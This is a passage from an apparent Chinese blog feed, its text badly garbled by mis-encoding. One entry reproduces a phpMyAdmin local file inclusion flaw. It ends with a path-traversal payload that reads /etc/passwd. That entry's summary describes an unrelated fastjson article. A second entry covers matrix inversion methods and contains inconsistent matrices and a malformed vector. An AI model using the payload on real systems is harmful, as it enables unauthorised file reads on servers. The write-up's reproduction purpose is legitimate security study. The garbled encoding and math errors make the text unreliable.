alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%2010.png"></p><p><code>target</code>å¯ä»¥ä¼ å…¥ä¸€ä¸ªå€¼ï¼Œç„¶åå¯ä»¥åˆ©ç”¨è¿™ä¸ª<code>target</code>æ¥è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œç”¨æ¥è¾¾åˆ°æœ¬åœ°æ–‡ä»¶åŒ…å«</p><p>æƒ³è¦è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼Œé‚£ä¹ˆtargetéœ€è¦æ»¡è¶³&amp;&amp;åé¢çš„å‡ ä¸ªæ¡ä»¶ï¼Œå³ä»¥ä¸‹æ¡ä»¶</p><ul><li>ä¸èƒ½ä¸ºç©º</li><li>æ˜¯å­—ç¬¦ä¸²</li><li>ä¸èƒ½ä»¥<code>index</code>å¼€å¤´</li><li>ä¸åœ¨é»‘åå•<code>target_blacklist</code>ä¸­</li><li>å¯ä»¥é€šè¿‡å‡½æ•°<code>checkPageValidity</code>çš„éªŒè¯</li></ul><p>é»‘åå•è¦æ±‚å‚æ•°ä¸æ˜¯<code>import.php</code> æˆ– <code>export.php</code> å°±è¡Œ</p><p>æ¥ä¸‹æ¥é‚£å°±æ¥çœ‹çœ‹<code>checkPageValidity</code>å‡½æ•°æ˜¯æ€ä¹ˆéªŒè¯çš„</p><p>å‡½æ•°å®šä¹‰åœ¨\libraries\classes\Core.php</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%2011.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%2011.png"></p><p>è¦é€šè¿‡éªŒè¯ï¼Œæ—¢è¦å‡½æ•°è¿”å›true</p><p>åˆ™åŒ…å«çš„æ–‡ä»¶å¿…é¡»åŒ…å«åœ¨ç™½åå•<code>whitelist</code>ä¸­</p><p>é‚£æˆ‘ä»¬å…ˆå»çœ‹çœ‹ç™½åå•æœ‰å•¥</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%2012.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%2012.png"></p><p>æ¥ä¸‹æ¥åˆ†æä»¥ä¸‹checkå‡½æ•°å‡ ç§è¿”å›trueçš„æƒ…å†µï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„</p><p>ç¬¬ä¸€ä¸ªæ˜¯ç›´æ¥çœ‹åœ¨ä¸åœ¨ç™½åå•é‡Œï¼Œæ²¡æœ‰æ“ä½œç©ºé—´</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%2013.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%2013.png"></p><p>å†æ¥çœ‹çœ‹ç¬¬äºŒä¸ª</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%2014.png" alt="phpmyadmin%E7%9A%84%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20830a78be83a34810b86061b7eada5da0/Untitled%2014.png"></p><p>è¿™é‡Œæ¶‰åŠä¸¤ä¸ªå‡½æ•°mb_substrå’Œmb_strpos</p><p>mb_substrçš„å®šä¹‰ï¼Œç®€å•æ¥è¯´è¿™ä¸ªå‡½æ•°å°±æ˜¯è·å–å­å­—ç¬¦ä¸²</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mb_substr(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$str</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$start</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$length</span> = <span class="literal">NULL</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = mb_internal_encoding()</span><br><span class="line">): <span class="keyword">string</span></span><br></pre></td></tr></table></figure><p><strong>å‚æ•°è§£é‡Š</strong></p><ul><li><strong><code>str</code></strong>ä»è¯¥ string ä¸­æå–å­å­—ç¬¦ä¸²ã€‚</li><li><strong><code>start</code></strong>å¦‚æœ <strong><code>start</code></strong> ä¸æ˜¯è´Ÿæ•°ï¼Œè¿”å›çš„å­—ç¬¦ä¸²ä¼šä» <strong><code>str</code></strong> ç¬¬ <strong><code>start</code></strong> çš„ä½ç½®å¼€å§‹ï¼Œä» 0 å¼€å§‹è®¡æ•°ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå­—ç¬¦ä¸² â€˜<code>abcdef</code>â€˜ï¼Œä½ç½® <code>0</code> çš„å­—ç¬¦æ˜¯ â€˜<code>a</code>â€˜ï¼Œä½ç½® <code>2</code> çš„å­—ç¬¦æ˜¯ â€˜<code>c</code>â€˜ï¼Œä»¥æ­¤ç±»æ¨ã€‚<br>å¦‚æœ <strong><code>start</code></strong> æ˜¯è´Ÿæ•°ï¼Œè¿”å›çš„å­—ç¬¦ä¸²æ˜¯ä» <strong><code>str</code></strong> æœ«å°¾å¤„ç¬¬ <strong><code>start</code></strong> ä¸ªå­—ç¬¦å¼€å§‹çš„ã€‚</li><li><strong><code>length str</code></strong> ä¸­è¦ä½¿ç”¨çš„æœ€å¤§å­—ç¬¦æ•°ã€‚å¦‚æœçœç•¥äº†æ­¤å‚æ•°æˆ–è€…ä¼ å…¥äº† <code>NULL</code>ï¼Œåˆ™ä¼šæå–åˆ°å­—ç¬¦ä¸²çš„å°¾éƒ¨ã€‚</li><li><strong><code>encoding  encoding</code></strong> å‚æ•°ä¸ºå­—ç¬¦ç¼–ç ã€‚å¦‚æœçœç•¥æˆ–æ˜¯ <strong><code>null</code></strong>ï¼Œåˆ™ä½¿ç”¨å†…éƒ¨å­—ç¬¦ç¼–ç ã€‚</li></ul><p><strong>è¿”å›å€¼</strong></p><p>mb_substr() å‡½æ•°æ ¹æ® start å’Œ length å‚æ•°è¿”å› str ä¸­æŒ‡å®šçš„éƒ¨åˆ†ã€‚</p><p>è€Œmb_strposï¼Œç®€å•æ¥è¯´å°±æ˜¯æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mb_strpos(</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$haystack</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$needle</span>,</span><br><span class="line">    <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>,</span><br><span class="line">    <span class="keyword">string</span> <span class="variable">$encoding</span> = mb_internal_encoding()</span><br><span class="line">): <span class="keyword">int</span></span><br></pre></td></tr></table></figure><p><strong>å‚æ•°è§£é‡Š</strong></p><ul><li><strong><code>haystack</code></strong>è¦è¢«æ£€æŸ¥çš„ stringã€‚</li><li><strong><code>needle</code></strong>åœ¨ <strong><code>haystack</code></strong> ä¸­æŸ¥æ‰¾è¿™ä¸ªå­—ç¬¦ä¸²ã€‚ å’Œ <code>strpos()</code> ä¸åŒçš„æ˜¯ï¼Œæ•°å­—çš„å€¼ä¸ä¼šè¢«å½“åšå­—ç¬¦çš„é¡ºåºå€¼ã€‚</li><li><strong><code>offset</code></strong>æœç´¢ä½ç½®çš„åç§»ã€‚å¦‚æœæ²¡æœ‰æä¾›è¯¥å‚æ•°ï¼Œå°†ä¼šä½¿ç”¨ 0ã€‚è´Ÿæ•°çš„ offset ä¼šä»å­—ç¬¦ä¸²å°¾éƒ¨å¼€å§‹ç»Ÿè®¡ã€‚</li><li><strong><code>encoding</code></strong> å‚æ•°ä¸ºå­—ç¬¦ç¼–ç ã€‚å¦‚æœçœç•¥æˆ–æ˜¯ <strong><code>null</code></strong>ï¼Œåˆ™ä½¿ç”¨å†…éƒ¨å­—ç¬¦ç¼–ç ã€‚</li></ul><p><strong>è¿”å›å€¼</strong></p><p>è¿”å› string çš„ haystack ä¸­ needle é¦–æ¬¡å‡ºç°ä½ç½®çš„æ•°å€¼ã€‚ å¦‚æœæ²¡æœ‰æ‰¾åˆ° needleï¼Œå®ƒå°†è¿”å› falseã€‚</p><p>äº†è§£ä¸¤ä¸ªå‡½æ•°ä»¥åï¼Œé‚£è¿™ä¸ªè¿”å›trueçš„æ¡ä»¶å°±æ˜¯?åé¢çš„å­—ç¬¦ä¸²è¦æ»¡è¶³ç™½åå•ï¼Œä¹Ÿæš‚æ—¶æ— æ³•æ‰¾åˆ°åˆ©ç”¨æ–¹æ³•</p><p>äºæ˜¯æ¥çœ‹ç¬¬ä¸‰ä¸ªè¿”å›true</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%2015.png" alt="Untitled"></p><p>æ¯”èµ·ç¬¬äºŒä¸ªè¿”å›trueçš„åœ°æ–¹ï¼Œå¤šäº†ä¸€ä¸ª<code>urldecode</code>å‡½æ•°</p><p>é‚£å°±ç®€å•äº†è¿™é‡Œç”¨urlå…¨ç¼–ç æ–¹å¼å¯¹?è¿›è¡Œç¼–ç å°±å¯ä»¥ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:/index.php?target=db_sql.php%<span class="number">3</span>f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">å¯¹äºfastjsonååºåˆ—åŒ–æ¼æ´çš„åˆ†æå’Œå¯¹äºæœ€æ–°çš„1.2.47ç‰ˆæœ¬çš„JNDIæ³¨å…¥ç»•è¿‡çš„å¤ç°</summary>
    
    
    
    <category term="æ¼æ´å¤ç°" scheme="http://www.fxizenta.design/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="phpmyadmin" scheme="http://www.fxizenta.design/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/phpmyadmin/"/>
    
    
    <category term="RCE" scheme="http://www.fxizenta.design/tags/RCE/"/>
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="http://www.fxizenta.design/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>çŸ©é˜µæ±‚é€†çš„å‡ ç§æ–¹æ³•</title>
    <link href="http://www.fxizenta.design/2021/08/04/Matrix-inverse/"/>
    <id>http://www.fxizenta.design/2021/08/04/Matrix-inverse/</id>
    <published>2021-08-03T16:41:16.000Z</published>
    <updated>2021-08-03T17:18:05.035Z</updated>
    
    <content type="html"><![CDATA[<h1 id="çŸ©é˜µæ±‚é€†çš„å‡ ç§æ–¹æ³•"><a href="#çŸ©é˜µæ±‚é€†çš„å‡ ç§æ–¹æ³•" class="headerlink" title="çŸ©é˜µæ±‚é€†çš„å‡ ç§æ–¹æ³•"></a>çŸ©é˜µæ±‚é€†çš„å‡ ç§æ–¹æ³•</h1><p>åœ¨å­¦ä¹ Hillç®—æ³•çš„è¿‡ç¨‹ä¸­ï¼Œçªç„¶æ„è¯†åˆ°è‡ªå·±å¯¹çŸ©é˜µçš„å¾ˆå¤šä¸œè¥¿éƒ½å·²ç»è¿˜ç»™è€å¸ˆï¼Œäºæ˜¯æ‰“ç®—æŠŠè¿™ä¸ªä¸¢äº†å¿«ä¸¤å¹´çš„ä¸œè¥¿é‡æ–°æ¡èµ·æ¥å­¦ä¹ ä¸€ä¸‹</p><h1 id="å¾…å®šç³»æ•°æ³•"><a href="#å¾…å®šç³»æ•°æ³•" class="headerlink" title="å¾…å®šç³»æ•°æ³•"></a>å¾…å®šç³»æ•°æ³•</h1><p>æ¯”è¾ƒé€‚ç”¨äºä½é˜¶çš„çŸ©é˜µï¼Œé«˜é˜¶çŸ©é˜µè®¡ç®—é‡æœ‰äº¿ç‚¹ç‚¹å¤§</p><p>æ²¡å•¥å¥½è¯´çš„ï¼Œå°±æ˜¯åˆ—ä¸ªçŸ©é˜µæ–¹ç¨‹ç„¶åå†åˆ†è§£ä¸ºæˆ‘ä»¬æ‰€ç†ŸçŸ¥çš„æ–¹ç¨‹æ ¼å¼</p><p>ç„¶åå†æ±‚è§£</p><p>egï¼š</p><p>$\left[ \begin{matrix} 1 &amp; 2 \\ -1 &amp;-3  \end{matrix} \right]$çš„é€†çŸ©é˜µçš„æ±‚è§£</p><p>è®¾é€†çŸ©é˜µä¸º$\left[ \begin{matrix} a &amp; b \\ c &amp;d  \end{matrix} \right]$</p><p>åˆ™$\left[ \begin{matrix} 1 &amp; 2 \\ -2 &amp;-3  \end{matrix} \right]\left[ \begin{matrix} a &amp; b \\ c &amp;d  \end{matrix} \right]=\left[ \begin{matrix} 1 &amp; 0 \\ 0 &amp;1  \end{matrix} \right]$</p><p>å³æœ‰</p><p>$\left[ \begin{matrix} a+2c &amp; b+2d \\ -2a-3c &amp;-2b-3d  \end{matrix} \right]=\left[ \begin{matrix} 1 &amp; 0 \\ 0 &amp;1  \end{matrix} \right]$</p><p>å¯ä»¥å¾—åˆ°ä»¥ä¸‹æ–¹ç¨‹</p><p>$a+2c=1$</p><p>$b+2d=0$</p><p>$-2a-3c=0$</p><p>$-2b-3d=1$</p><p>è§£å¾—a=-3,b=-2,c=2,d=1</p><h1 id="é«˜æ–¯æ¶ˆå…ƒæ³•"><a href="#é«˜æ–¯æ¶ˆå…ƒæ³•" class="headerlink" title="é«˜æ–¯æ¶ˆå…ƒæ³•"></a>é«˜æ–¯æ¶ˆå…ƒæ³•</h1><p>è¿™ä¸ªåº”è¯¥æ˜¯æµä¼ æœ€å¹¿çš„æ±‚é€†å…ƒç‰ˆæœ¬ï¼Œè™½ç„¶æˆ‘é™¤äº†åœ¨è€ƒè¯•æ‰‹ç®—ä¸­æœ‰æ‰€åº”ç”¨ï¼Œç›®å‰è¿˜æ²¡æœ‰çœ‹åˆ°å…¶ä»–ä½¿ç”¨è¿™ä¸ªçš„åœ°æ–¹</p><p>é«˜æ–¯æ¶ˆå…ƒæ³•æœ‰ä¸¤ä¸ªç»†åˆ†ï¼šè¡Œå˜æ¢ä¸åˆ—å˜æ¢ï¼ŒåŸç†æ˜¯ä¸€æ ·çš„ï¼Œä¸€èˆ¬ç”¨è¡Œå˜æ¢ã€‚</p><p>é«˜æ–¯æ¶ˆå…ƒæ³•å…ˆå°†çŸ©é˜µAä¸å•ä½çŸ©é˜µIè¿›è¡Œè¿æ¥å½¢æˆä¸€ä¸ªæ–°çš„å¢å¹¿çŸ©é˜µ.</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled.png" alt="%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%20121b63c332ea4e9b8e1a43957b6070ff/Untitled.png"></p><p>eg:</p><p>$K=\left[ \begin{matrix} 2 &amp; -1 &amp; 0 \\ -1 &amp;2 &amp; -1 \\ 0 &amp;-1&amp; 2  \end{matrix} \right]$</p><p>æ¥ä¸‹æ¥ç”¨é«˜æ–¯æ¶ˆå…ƒæ³•æ¥æ±‚Kçš„é€†çŸ©é˜µ</p><p>$\left[ \begin{matrix} K&amp;I  \end{matrix} \right]=\left[ \begin{matrix} 2 &amp; -1 &amp; 0 &amp;1&amp;0&amp;0\\ -1 &amp;2 &amp; -1&amp;0&amp;1&amp;0 \\ 0 &amp;-1&amp; 2&amp;0&amp;0&amp;1  \end{matrix} \right]$â†’$\left[ \begin{matrix} 2 &amp; -1 &amp; 0 &amp;1&amp;0&amp;0\\ 0 &amp;3/2 &amp; -1&amp;1/2&amp;1&amp;0 \\ 0 &amp;-1&amp; 2&amp;0&amp;0&amp;1  \end{matrix} \right]$â†’$\left[ \begin{matrix} 2 &amp; -1 &amp; 0 &amp;1&amp;0&amp;0\\ 0 &amp;3/2 &amp; -1&amp;1/2&amp;1&amp;0 \\ 0 &amp;0&amp; 4/3&amp;1/3&amp;2/3&amp;1  \end{matrix} \right]$</p><p>KçŸ©é˜µå˜æˆäº†ä¸Šä¸‰è§’çŸ©é˜µï¼Œæ¥ä¸‹æ¥å›ä»£å°±å¯ä»¥åˆ†åˆ«æ±‚è§£å‡º$K^{-1}$,å¦‚ä¸‹</p><p>$\left[ \begin{matrix} 2 &amp; -1 &amp; 0 &amp;1&amp;0&amp;0\\ 0 &amp;3/2 &amp; 0&amp;3/4&amp;3/2&amp;3/4 \\ 0 &amp;0&amp; 4/3&amp;1/3&amp;2/3&amp;1  \end{matrix} \right]$â†’$\left[ \begin{matrix} 2 &amp; 0 &amp; 0 &amp;3/2&amp;1&amp;1/2\\ 0 &amp;3/2 &amp; 0&amp;3/4&amp;3/2&amp;3/4 \\ 0 &amp;0&amp; 4/3&amp;1/3&amp;2/3&amp;1  \end{matrix} \right]$â†’</p><p>$\left[ \begin{matrix} 1 &amp; 0 &amp; 0 &amp;3/4&amp;1/2&amp;1/4\\ 0 &amp;1 &amp; 0&amp;1/2&amp;1&amp;1/2 \\ 0 &amp;0&amp; 1&amp;1/4&amp;1/2&amp;3/4  \end{matrix} \right]=$$\left[ \begin{matrix} I &amp; K^{-1}   \end{matrix} \right]$</p><p>æ±‚å¾—é€†çŸ©é˜µ$K^{-1}$</p><h1 id="LUåˆ†è§£æ³•"><a href="#LUåˆ†è§£æ³•" class="headerlink" title="LUåˆ†è§£æ³•"></a>LUåˆ†è§£æ³•</h1><p>LUåˆ†è§£æ³•å®é™…ä¸Šæ˜¯é«˜æ–¯æ¶ˆå…ƒæ³•çš„å˜ç§åº”ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•æ›´æ˜“äºå®ç°å¹¶è¡ŒåŒ–ã€‚è®¡ç®—æœºåŸºæœ¬ç”¨è¿™ç§æ–¹æ³•ï¼Œé¢å¯¹å¤§çŸ©é˜µæ—¶æœ‰å¥‡æ•ˆã€‚</p><p>LUåˆ†è§£å³å°†ä¸€ä¸ªçŸ©é˜µåˆ†è§£ä¸ºä¸€ä¸ªå•ä½ä¸‹ä¸‰è§’çŸ©é˜µå’Œä¸€ä¸ªä¸Šä¸‰è§’çŸ©é˜µçš„ä¹˜ç§¯ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸æ˜¯æ‰€æœ‰çš„çŸ©é˜µéƒ½å¯ä»¥è¿›è¡ŒLUåˆ†è§£çš„</p><h2 id="LUåˆ†è§£çš„å‰æ"><a href="#LUåˆ†è§£çš„å‰æ" class="headerlink" title="LUåˆ†è§£çš„å‰æ"></a>LUåˆ†è§£çš„å‰æ</h2><ol><li>çŸ©é˜µæ˜¯æ–¹é˜µï¼ˆLUåˆ†è§£ä¸»è¦æ˜¯é’ˆå¯¹æ–¹é˜µï¼‰ï¼›</li><li>çŸ©é˜µæ˜¯å¯é€†çš„ï¼Œä¹Ÿå°±æ˜¯è¯¥çŸ©é˜µæ˜¯æ»¡ç§©çŸ©é˜µï¼Œæ¯ä¸€è¡Œéƒ½æ˜¯ç‹¬ç«‹å‘é‡ï¼›</li><li>æ¶ˆå…ƒè¿‡ç¨‹ä¸­æ²¡æœ‰0ä¸»å…ƒå‡ºç°ï¼Œä¹Ÿå°±æ˜¯æ¶ˆå…ƒè¿‡ç¨‹ä¸­ä¸èƒ½å‡ºç°è¡Œäº¤æ¢çš„åˆç­‰å˜æ¢</li></ol><h2 id="LUåˆ†è§£æ±‚é€†çŸ©é˜µçš„æµç¨‹"><a href="#LUåˆ†è§£æ±‚é€†çŸ©é˜µçš„æµç¨‹" class="headerlink" title="LUåˆ†è§£æ±‚é€†çŸ©é˜µçš„æµç¨‹"></a>LUåˆ†è§£æ±‚é€†çŸ©é˜µçš„æµç¨‹</h2><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%201.png" alt=""></p><h1 id="SVDåˆ†è§£æ³•"><a href="#SVDåˆ†è§£æ³•" class="headerlink" title="SVDåˆ†è§£æ³•"></a>SVDåˆ†è§£æ³•</h1><p>å³å¥‡å¼‚å€¼åˆ†è§£æ³•(SingularValue Decomposition)</p><p>SVDåˆ†è§£å¯ä»¥å¯¹ä¸æ˜¯æ–¹é˜µçš„çŸ©é˜µè¿›è¡Œåˆ†è§£</p><p>SVDåˆ†è§£å°†çŸ©é˜µAåˆ†è§£ä¸ºä¸‰ä¸ªçŸ©é˜µçš„ä¹˜ç§¯ï¼Œåˆ†åˆ«ä¸ºæ­£äº¤çŸ©é˜µUã€å¯¹è§’çŸ©é˜µWå’Œæ­£äº¤çŸ©é˜µçš„è½¬ç½®çŸ©é˜µV</p><p>$A=UWV^T$</p><p>Uæ˜¯ä¸€ä¸ª$mXm$çš„çš„çŸ©é˜µï¼ŒWæ˜¯ä¸€ä¸ª$mXn$çš„çŸ©é˜µï¼Œä¸”é™¤äº†ä¸»å¯¹è§’çº¿ä¸Šçš„å…ƒç´ ä»¥å¤–å…¨ä¸º0.ä¸»å¯¹è§’çº¿ä¸Šçš„æ¯ä¸ªå…ƒç´ éƒ½è¢«ç§°ä¸ºå¥‡å¼‚å€¼ï¼ŒVæ˜¯ä¸€ä¸ª$nXn$çš„çŸ©é˜µ</p><p>æ±‚é€†å³</p><p>$A^{-1}=VW^{-1}U^T$</p><h2 id="å¦‚ä½•å¾—åˆ°-UWV-T"><a href="#å¦‚ä½•å¾—åˆ°-UWV-T" class="headerlink" title="å¦‚ä½•å¾—åˆ°$UWV^T$"></a>å¦‚ä½•å¾—åˆ°$UWV^T$</h2><p>æˆ‘ä»¬å…ˆå°†Aå’ŒAçš„è½¬ç½®åšçŸ©é˜µä¹˜æ³•ï¼Œé‚£ä¹ˆä¼šå¾—åˆ°m*mçš„ä¸€ä¸ªæ–¹é˜µ$AA^T$,æ—¢ç„¶$AA^T$æ˜¯æ–¹é˜µï¼Œæ‰€ä»¥å¯ä»¥è¿›è¡Œç‰¹å¾åˆ†è§£å¯ä»¥å¾—åˆ°</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%202.png" alt="%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%20121b63c332ea4e9b8e1a43957b6070ff/Untitled%202.png"></p><p>å¯ä»¥å¾—åˆ°çŸ©é˜µ [å…¬å¼] çš„nä¸ªç‰¹å¾å€¼å’Œå¯¹åº”çš„nä¸ªç‰¹å¾å‘é‡väº†ã€‚å°† [å…¬å¼] çš„æ‰€æœ‰ç‰¹å¾å‘é‡å¼ æˆä¸€ä¸ªnÃ—nçš„çŸ©é˜µV,äºæ˜¯æˆ‘ä»¬å°±å¾—åˆ°äº†çŸ©é˜µVï¼Œæˆ‘ä»¬æŠŠVä¸­çš„æ¯ä¸ªç‰¹å¾å‘é‡å«åšAçš„å³å¥‡å¼‚å‘é‡ã€‚</p><p>åŒç†æˆ‘ä»¬å¯ä»¥ç‰¹å¾åˆ†è§£åˆ°ç‰¹å¾å€¼å’Œç‰¹å¾å‘é‡æ»¡è¶³ä¸‹å¼</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021Untitled%203.png" alt="%E7%9F%A9%E9%98%B5%E6%B1%82%E9%80%86%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95%20121b63c332ea4e9b8e1a43957b6070ff/Untitled%203.png"></p><p>åŒç†ï¼Œ[å…¬å¼] çš„æ‰€æœ‰ç‰¹å¾å‘é‡å¼ æˆä¸€ä¸ªmÃ—mçš„çŸ©é˜µUï¼Œè¿™å°±æ˜¯UçŸ©é˜µäº†ï¼ŒUçŸ©é˜µé‡Œçš„æ¯ä¸ªç‰¹å¾å‘é‡å«åšAçš„å·¦å¥‡å¼‚å‘é‡</p><p>ç°åœ¨å°±å·®WçŸ©é˜µäº†</p><p>å› ä¸ºæœ‰</p><p>$A=UWV^T=&gt;AV=UWVTV=&gt;AV=UW=&gt;Av_i=\sigma_iu_i=&gt;\sigma_i=Av_i/u_i$</p><p>é€šè¿‡è¿™ä¸ªæˆ‘ä»¬å¯ä»¥æ±‚å¾—æ¯ä¸ªå¥‡å¼‚å€¼çš„å€¼ï¼Œè¿›è€Œå¯ä»¥æ±‚å¥‡å¼‚å€¼çŸ©é˜µW</p><p>ä¸‹é¢è¡¥å……å¯¹äºä¸ºä»€ä¹ˆ$A^TA$çš„ç‰¹å¾å‘é‡ç»„æˆçš„å°±æ˜¯æˆ‘ä»¬SVDä¸­çš„VçŸ©é˜µï¼Œè€Œ$AA^T$çš„ç‰¹å¾å‘é‡ç»„æˆçš„å°±æ˜¯æˆ‘ä»¬SVDä¸­çš„UçŸ©é˜µ</p><p>ä¸‹é¢ä»¥VçŸ©é˜µçš„è¯æ˜ä¸ºä¾‹å­</p><p>$A=UWV^T=&gt;A^T=VWU^T=&gt;A^TA=VWU^TUWV^T=VW^2V^T$</p><p>å¾—è¯</p><h2 id="SVDä¾‹é¢˜"><a href="#SVDä¾‹é¢˜" class="headerlink" title="SVDä¾‹é¢˜"></a>SVDä¾‹é¢˜</h2><p>å¯¹A=$\left[ \begin{matrix} 0 &amp; 1 \\ 1 &amp;1  \\ 1&amp;0  \end{matrix} \right]$</p><p>å…ˆæ±‚$A^TA$å’Œ$AA^T$</p><p>$A^TA=\left[ \begin{matrix} 0 &amp; 1 &amp; 1 \\ 1 &amp;1 &amp; 0   \end{matrix} \right]\left[ \begin{matrix} 0 &amp; 1  \\ 1 &amp;1 \\ 1&amp;0   \end{matrix} \right]=\left[ \begin{matrix} 2 &amp; 1  \\ 1 &amp;2   \end{matrix} \right]$</p><p>$AA^T=\left[ \begin{matrix} 0 &amp; 1  \\ 1 &amp;1 \\1&amp;0  \end{matrix} \right]\left[ \begin{matrix} 0 &amp; 1&amp;1  \\ 1 &amp;1&amp;0   \end{matrix} \right]=\left[ \begin{matrix} 1 &amp; 1&amp;0  \\ 1 &amp;2&amp;1\\0&amp;1&amp;1   \end{matrix} \right]$</p><p>è¿›è€Œæ±‚å¾—$A^TA$çš„ç‰¹å¾å€¼å’Œç‰¹å¾å‘é‡</p><p>$\lambda_1=3;v_1=\left[ \begin{matrix} 1/\sqrt2  \\ 1 &amp;2&amp;1\\0&amp;1&amp;1   \end{matrix} \right]$ $\lambda_2=1;v_2=\left[ \begin{matrix} -1/\sqrt2  \\ 1/\sqrt2   \end{matrix} \right]$</p><p>æ¥ç€æ±‚$AA^T$çš„ç‰¹å¾å€¼å’Œç‰¹å¾å‘é‡</p><p>$\lambda_1=3;u_1=\left[ \begin{matrix} 1/\sqrt6  \\ 2/\sqrt6\\1/\sqrt6   \end{matrix} \right]$ $\lambda_2=1;u_2=\left[ \begin{matrix} 1/\sqrt2  \\ 0\\-1/\sqrt2   \end{matrix} \right]$ $\lambda_3=0;u_3=\left[ \begin{matrix} 1/\sqrt3  \\ -1/\sqrt3\\1/\sqrt3   \end{matrix} \right]$</p><p>é€šè¿‡$Av_i=\sigma_iu_i,i=1,2$æ±‚å¥‡å¼‚å€¼</p><p>$\left[ \begin{matrix} 0&amp;1  \\ 1&amp;1\\1&amp;0   \end{matrix} \right]\left[ \begin{matrix} 1\sqrt2  \\ 1\sqrt2   \end{matrix} \right]=\sigma_1\left[ \begin{matrix} 1/\sqrt6  \\ 2/\sqrt6\\1/\sqrt6   \end{matrix} \right]=&gt;\sigma_1=\sqrt3$</p><p>$\left[ \begin{matrix} 0&amp;1  \\ 1&amp;1\\1&amp;0   \end{matrix} \right]\left[ \begin{matrix} -1\sqrt2  \\ 1\sqrt2   \end{matrix} \right]=\sigma_2\left[ \begin{matrix} 1/\sqrt2  \\ 0\\-1/\sqrt2   \end{matrix} \right]=&gt;\sigma_2=1$</p><p>ä¹Ÿå¯ä»¥ç”¨ [å…¬å¼] ç›´æ¥æ±‚å‡ºå¥‡å¼‚å€¼ä¸º [å…¬å¼] å’Œ1.</p><p>æœ€ç»ˆå®Œæˆsvdåˆ†è§£ä¸º</p><p>$A=UWV^T=\left[ \begin{matrix} 1/\sqrt6 &amp; 1\sqrt2&amp;1/\sqrt3  \\ 2/\sqrt6&amp;0&amp;-1/\sqrt3\\1/\sqrt6&amp;-1/\sqrt2&amp;1/\sqrt3   \end{matrix} \right]\left[ \begin{matrix} \sqrt3&amp;0  \\ 0&amp;1\\0&amp;0   \end{matrix} \right]\left[ \begin{matrix} 1/\sqrt2&amp;1/\sqrt2  \\ -1/\sqrt2&amp;1/\sqrt2   \end{matrix} \right]$</p>]]></content>
    
    
      
      
